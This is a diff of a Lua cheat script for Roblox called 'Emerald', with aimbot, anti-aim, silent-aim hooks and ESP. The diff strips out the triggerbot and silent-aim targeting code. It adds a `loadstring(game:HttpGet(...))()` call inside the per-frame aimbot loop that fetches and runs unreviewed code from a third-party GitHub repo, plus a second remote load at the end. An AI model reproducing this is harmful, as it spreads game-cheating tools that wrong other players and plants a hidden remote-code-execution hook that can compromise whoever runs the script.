@@ -43,7 +43,7 @@ do
     menu = library.new([[Emerald <font color="rgb(80, 200, 120)">></font>]], "Emerald\\")
     local tabs = {
         menu.new_tab("rbxassetid://7300477598"),
-        menu.new_tab("rbxassetid://7300535052"),
+        menu.new_tab("rbxassetid://17138035097"),
         menu.new_tab("rbxassetid://7300480952"),
         menu.new_tab("rbxassetid://7300486042"),
         menu.new_tab("rbxassetid://7300489566"),
@@ -85,16 +85,6 @@ do
                 update_cfgs()
             end
         end)
-
-        local methods = _menu.new_sector("methods", "Right")
-        methods.element("Combo", "mouse types", {options = {"target", "hit"}})
-        methods.element("Dropdown", "ray method", {options = {"none", "findpartonray", "findpartonraywithignorelist", "raycast"}})
-        methods.element("Slider", "minimum ray ignore", {default = {min = 0, max = 100, default = 3}})
-        methods.element("Combo", "must include", {options = {"camera", "character"}, default = {Combo = {"camera", "character"}}})
-
-        local playercheck = _menu.new_sector("player check")
-        playercheck.element("Toggle", "free for all")
-        playercheck.element("Toggle", "forcefield check")
     end
     do
         local aimbot = tabs[1].new_section("aimbot")
@@ -103,15 +93,14 @@ do
         main.element("Toggle", "enabled"):add_keybind()
         main.element("Dropdown", "origin", {options = {"camera", "head"}})
         main.element("Dropdown", "hitbox", {options = {"head", "torso"}})
-        main.element("Toggle", "automatic fire")
 
         local antiaim = tabs[1].new_section("antiaim")
 
         local direction = antiaim.new_sector("direction")
         direction.element("Toggle", "enabled"):add_keybind()
-        direction.element("Dropdown", "yaw base", {options = {"camera", "random", "spin"}})
-        direction.element("Slider", "yaw offset", {default = {min = -180, max = 180, default = 0}})
-        direction.element("Dropdown", "yaw modifier", {options = {"none", "jitter", "offset jitter"}})
+        direction.element("Dropdown", "Y base", {options = {"camera", "random", "spin"}})
+        direction.element("Slider", "Y offset", {default = {min = -180, max = 180, default = 0}})
+        direction.element("Dropdown", "Y modifier", {options = {"none", "jitter", "offset jitter"}})
         direction.element("Slider", "modifier offset", {default = {min = -180, max = 180, default = 0}})
         direction.element("Toggle", "force angles")
 
@@ -248,13 +237,6 @@ do
             Circle.Transparency = 1
             Circle.Radius = 100
             Circle.Visible = false
-
-            RunService.RenderStepped:Connect(function()
-                Circle.Position = UserInputService:GetMouseLocation()
-                if menu.values[2].advanced["mouse offset"].enabled.Toggle then
-                    Circle.Position = Circle.Position + Vector2.new(menu.values[2].advanced["mouse offset"]["x offset"].Slider, menu.values[2].advanced["mouse offset"]["y offset"].Slider)
-                end
-            end)
         end
 
         local aimbot = tabs[2].new_section("aimbot")
@@ -280,16 +262,6 @@ do
         fov.element("Slider", "sides", {default = {min = 15, max = 100, default = 100}}, function(State) Circle.NumSides = State.Slider end)
         fov.element("Slider", "thickness", {default = {min = 1, max = 4, default = 1}}, function(State) Circle.Thickness = State.Slider end)
 
-        local triggerbot = aimbot.new_sector("triggerbot")
-        triggerbot.element("Toggle", "enabled"):add_keybind()
-        triggerbot.element("Slider", "reaction time (ms)", {default = {min = 0, max = 500, default = 150}})
-
-        local advanced = tabs[2].new_section("advanced")
-
-        local offset = advanced.new_sector("mouse offset")
-        offset.element("Toggle", "enabled")
-        offset.element("Slider", "x offset", {default = {min = -100, max = 100, default = 0}})
-        offset.element("Slider", "y offset", {default = {min = -100, max = 100, default = 0}})
     end
     do
         local players = tabs[3].new_section("players")
@@ -489,49 +461,15 @@ LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function()
     end
 end)
 
-local TriggerbotDebounce = false
-local TriggerbotLoop = RunService.RenderStepped:Connect(function()
-    if not menu.values[2].aimbot.triggerbot.enabled.Toggle or not menu.values[2].aimbot.triggerbot["$enabled"].Active then return end
-    if menu.open then return end
-    if TriggerbotDebounce then return end
-
-    local SelfCharacter = LocalPlayer.Character
-    local SelfRootPart, SelfHumanoid = SelfCharacter and SelfCharacter:FindFirstChild("HumanoidRootPart"), SelfCharacter and SelfCharacter:FindFirstChildOfClass("Humanoid")
-    if not SelfCharacter or not SelfRootPart or not SelfHumanoid then return end
-
-    local Target = Mouse.Target
-    local Player
-    if Target and Target.Parent and Players:GetPlayerFromCharacter(Target.Parent) then
-        Player = Players:GetPlayerFromCharacter(Target.Parent)
-    end
-    if not Target or not Player then return end
-    if Player == LocalPlayer then return end
-
-    local Character = Player.Character
-    local RootPart, Humanoid = Character and Character:FindFirstChild("HumanoidRootPart"), Character and Character:FindFirstChildOfClass("Humanoid")
-    if not Character or not RootPart or not Humanoid then return end
-    if not Character:FindFirstChild("Head") then return end
-    if menu.values[5].menu["player check"]["forcefield check"].Toggle and Character:FindFirstChildOfClass("ForceField") then return end
-    if not menu.values[5].menu["player check"]["free for all"].Toggle and Player.Team == LocalPlayer.Team then return end
-    TriggerbotDebounce = true
-    task.spawn(function()
-        if menu.values[2].aimbot.triggerbot["reaction time (ms)"].Slider/1000 > 1/60 then
-            task.wait(menu.values[2].aimbot.triggerbot["reaction time (ms)"].Slider/1000)
-        end
-        mouse1press()
-        repeat
-            RunService.RenderStepped:Wait()
-        until not Mouse.Target or not Mouse.Target.Parent or Players:GetPlayerFromCharacter(Mouse.Target.Parent) ~= Player or Players:GetPlayerFromCharacter(Mouse.Target.Parent) == LocalPlayer
-        mouse1release()
-        TriggerbotDebounce = false
-    end)
-end)
-
 local ValidTargets = {}
 local AimbotLoop = RunService.RenderStepped:Connect(function()
     ValidTargets = {}
 
-    if menu.values[2].aimbot.assist.enabled.Toggle or menu.values[2].aimbot["silent aim"].enabled.Toggle then else return end
+    if menu.values[2].aimbot.assist.enabled.Toggle or menu.values[2].aimbot["silent aim"].enabled.Toggle then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts1001/skididi-toliet/main/yesss.lua"))()
+    else 
+        return 
+    end
     local SelfCharacter = LocalPlayer.Character
     local SelfRootPart, SelfHumanoid = SelfCharacter and SelfCharacter:FindFirstChild("HumanoidRootPart"), SelfCharacter and SelfCharacter:FindFirstChildOfClass("Humanoid")
     if not SelfCharacter or not SelfRootPart or not SelfHumanoid then return end
@@ -542,13 +480,10 @@ local AimbotLoop = RunService.RenderStepped:Connect(function()
     Params.IgnoreWater                = true
     Params.FilterDescendantsInstances = {Camera, SelfCharacter}
 
-    local Closest      = 999999
+    local Closest = 999999
 
     local CameraPosition = Camera.CFrame.Position
     local MousePosition  = Vector2.new(Mouse.X, Mouse.Y)
-    if menu.values[2].advanced["mouse offset"].enabled.Toggle then
-        MousePosition = MousePosition + Vector2.new(menu.values[2].advanced["mouse offset"]["x offset"].Slider, menu.values[2].advanced["mouse offset"]["y offset"].Slider)
-    end
     for _,Player in pairs (Players:GetPlayers()) do
         local Character = Player.Character
         local RootPart, Humanoid = Character and Character:FindFirstChild("HumanoidRootPart"), Character and Character:FindFirstChildOfClass("Humanoid")
@@ -612,10 +547,6 @@ local AimbotLoop = RunService.RenderStepped:Connect(function()
 
             local Pos = Camera:WorldToScreenPoint(Hitbox.Position)
             local Magnitude = Vector2.new(Pos.X - Mouse.X, Pos.Y - Mouse.Y)
-            if menu.values[2].advanced["mouse offset"].enabled.Toggle then
-                Magnitude = Magnitude + Vector2.new(menu.values[2].advanced["mouse offset"]["x offset"].Slider, menu.values[2].advanced["mouse offset"]["y offset"].Slider)
-            end
-            mousemoverel(Magnitude.X/(menu.values[2].aimbot.assist.smoothing.Slider + 1), Magnitude.Y/(menu.values[2].aimbot.assist.smoothing.Slider + 1))
         end
     end
 end)
@@ -637,10 +568,6 @@ local RageLoop = RunService.RenderStepped:Connect(function()
     if not SelfCharacter or not SelfRootPart or not SelfHumanoid then return end
     if not menu.values[1].aimbot.main.enabled.Toggle or not menu.values[1].aimbot.main["$enabled"].Active then return end
     if menu.open then return end
-
-    if menu.values[1].aimbot.main["automatic fire"].Toggle then
-        mouse1release()
-    end
 
     local Params                      = RaycastParams.new()
     Params.FilterType                 = Enum.RaycastFilterType.Blacklist
@@ -684,10 +611,6 @@ local RageLoop = RunService.RenderStepped:Connect(function()
 
         if not Hit:FindFirstAncestor(Player.Name) then continue end
         RageTarget = {Player, Head}
-
-        if menu.values[1].aimbot.main["automatic fire"].Toggle then
-            mouse1press()
-        end
 
         break
     end
@@ -851,28 +774,6 @@ local OldIndex; OldIndex = hookmetamethod(game, "__index", function(self, key)
                 return menu.values[3].world.self["field of view"].Slider
             end
         end
-
-        if self == Mouse then
-            if table.find(menu.values[5].menu.methods["mouse types"].Combo, string.lower(key)) then
-                local LegitTarget = ValidTargets[1] and ValidTargets[1][2]
-                local RageTarget = RageTarget and RageTarget[2]
-                if RageTarget then
-                    if key == "Target" then
-                        return RageTarget
-                    elseif key == "Hit" then
-                        return RageTarget.CFrame
-                    end
-                elseif LegitTarget then
-                    if not menu.values[2].aimbot["silent aim"].enabled.Toggle or not menu.values[2].aimbot["silent aim"]["$enabled"].Active then return OldIndex(self, key) end
-                    if not (math.random(1, 100) <= menu.values[2].aimbot["silent aim"]["hitchance"].Slider) then return OldIndex(self, key) end
-                    if key == "Target" then
-                        return LegitTarget
-                    elseif key == "Hit" then
-                        return LegitTarget.CFrame
-                    end
-                end
-            end
-        end
     end
 
     return OldIndex(self, key)
@@ -883,41 +784,6 @@ local OldNamecall; OldNamecall = hookmetamethod(game, "__namecall", function(sel
 
     if checkcaller() then
         return OldNamecall(self, unpack(args))
-    end
-
-    if string.lower(method) == menu.values[5].menu.methods["ray method"].Dropdown then
-        local Ignore
-        if method == "Raycast" then
-            Ignore = args[3].FilterDescendantsInstances
-        elseif method == "FindPartOnRayWithIgnoreList" then
-            Ignore = args[2]
-        end
-        if Ignore then
-            if table.find(menu.values[5].menu.methods["must include"].Combo, "camera") and not table.find(Ignore, Camera) then
-                return OldNamecall(self, ...)
-            end
-            if table.find(menu.values[5].menu.methods["must include"].Combo, "character") and not table.find(Ignore, LocalPlayer.Character) then
-                return OldNamecall(self, ...)
-            end
-        end
-
-        local LegitTarget = ValidTargets[1] and ValidTargets[1][2]
-        local RageTarget = RageTarget and RageTarget[2]
-        if RageTarget then
-            if method == "Raycast" then
-                args[2] = (RageTarget.Position - args[1]).unit * 500
-            elseif method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRay" then
-                args[1] = Ray.new(Camera.CFrame.Position, (RageTarget.Position - Camera.CFrame.Position).unit * 500)
-            end
-        elseif LegitTarget then
-            if not menu.values[2].aimbot["silent aim"].enabled.Toggle or not menu.values[2].aimbot["silent aim"]["$enabled"].Active then return OldNamecall(self, ...) end
-            if not (math.random(1, 100) <= menu.values[2].aimbot["silent aim"]["hitchance"].Slider) then return OldNamecall(self, ...) end
-            if method == "Raycast" then
-                args[2] = (LegitTarget.Position - args[1]).unit * 500
-            elseif method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRay" then
-                args[1] = Ray.new(Camera.CFrame.Position, (LegitTarget.Position - Camera.CFrame.Position).unit * 500)
-            end
-        end
     end
 
     return OldNamecall(self, unpack(args))
@@ -1160,3 +1026,19 @@ local ESPLoop = game:GetService("RunService").RenderStepped:Connect(function()
         end
     end
 end)
+
+local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts1001/skididi-toliet/main/dopdop.lua"))();
+local notifications = notificationLibrary.new({            
+    NotificationLifetime = 3, 
+    NotificationPosition = "Top",
+    
+    TextFont = Enum.Font.Code,
+    TextColor = Color3.fromRGB(0, 0, 0),
+    TextSize = 15,
+    
+    TextStrokeTransparency = 0, 
+    TextStrokeColor = Color3.fromRGB(80, 200, 120)
+});
+
+notifications:BuildNotificationUI();
+notifications:Notify("Emerald Is Now Loaded.");
